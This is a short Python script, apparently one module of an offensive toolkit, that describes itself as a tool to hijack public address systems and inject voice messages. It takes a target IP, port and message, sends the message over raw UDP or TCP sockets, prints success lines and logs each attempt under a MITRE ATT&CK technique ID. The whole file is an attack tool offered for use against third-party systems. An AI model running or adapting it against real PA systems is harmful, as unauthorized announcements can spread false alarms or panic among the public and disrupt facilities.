#!/usr/bin/env python3
# modules/attacks/public_announcer_hijack.py

import argparse
import socket
import os
import time
import json
from datetime import datetime

LOG_FILE = "results/pa_hijack_log.json"
MITRE_TTP = "T1583.006"

def log_attack(ip, method, message):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "method": method,
            "message": message,
            "ttp": MITRE_TTP
        }) + "\n")

def send_udp_announcement(ip, port, message):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(message.encode(), (ip, port))
        sock.close()
        log_attack(ip, "UDP", message)
        print(f"[✓] PA announcement injected via UDP to {ip}:{port}")
    except Exception as e:
        print(f"[!] UDP injection failed: {e}")

def send_tcp_announcement(ip, port, message):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendall(message.encode())
        sock.close()
        log_attack(ip, "TCP", message)
        print(f"[✓] PA announcement injected via TCP to {ip}:{port}")
    except Exception as e:
        print(f"[!] TCP injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack PA systems and inject voice messages")
    parser.add_argument("--ip", required=True, help="Target PA system IP")
    parser.add_argument("--port", type=int, required=True, help="Target port")
    parser.add_argument("--message", required=True, help="Message to announce")
    parser.add_argument("--method", choices=["tcp", "udp"], default="udp", help="Protocol to use")
    args = parser.parse_args()

    if args.method == "udp":
        send_udp_announcement(args.ip, args.port, args.message)
    else:
        send_tcp_announcement(args.ip, args.port, args.message)
